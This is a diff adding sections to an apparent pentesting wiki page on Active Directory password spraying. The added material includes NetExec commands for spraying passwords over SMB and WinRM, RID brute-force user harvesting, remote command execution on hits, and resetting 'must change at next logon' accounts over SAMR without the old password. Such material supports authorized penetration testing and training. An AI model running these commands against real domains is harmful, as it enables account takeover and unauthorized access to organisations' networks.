@@ -44,6 +44,23 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
 
+- Using **NetExec (CME successor)** for targeted, low-noise spraying across SMB/WinRM:
+
+```bash
+# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
+netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts
+
+# Spray a single candidate password against harvested users over SMB
+netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
+  --continue-on-success --no-bruteforce --shares
+
+# Validate a hit over WinRM (or use SMB exec methods)
+netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"
+
+# Tip: sync your clock before Kerberos-based auth to avoid skew issues
+sudo ntpdate <DC_FQDN>
+```
+
 - Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 
 ```bash
@@ -102,6 +119,44 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
+
+### Identify and Take Over "Password must change at next logon" Accounts (SAMR)
+
+A low-noise technique is to spray a benign/empty password and catch accounts returning STATUS_PASSWORD_MUST_CHANGE, which indicates the password was forcibly expired and can be changed without knowing the old one.
+
+Workflow:
+- Enumerate users (RID brute via SAMR) to build the target list:
+
+{{#ref}}
+../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
+{{#endref}}
+
+```bash
+# NetExec (null/guest) + RID brute to harvest users
+netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
+```
+
+- Spray an empty password and keep going on hits to capture accounts that must change at next logon:
+
+```bash
+# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
+netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
+```
+
+- For each hit, change the password over SAMR with NetExec’s module (no old password needed when "must change" is set):
+
+```bash
+# Strong complexity to satisfy policy
+env NEWPASS='P@ssw0rd!2025#' ; \
+netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
+
+# Validate and retrieve domain password policy with the new creds
+netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
+```
+
+Operational notes:
+- Ensure your host clock is in sync with the DC before Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
+- A [+] without (Pwn3d!) in some modules (e.g., RDP/WinRM) means the creds are valid but the account lacks interactive logon rights.
 
 ## Brute Force
 
@@ -226,6 +281,8 @@ To use any of these tools, you need a user list and a password / a small list of
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
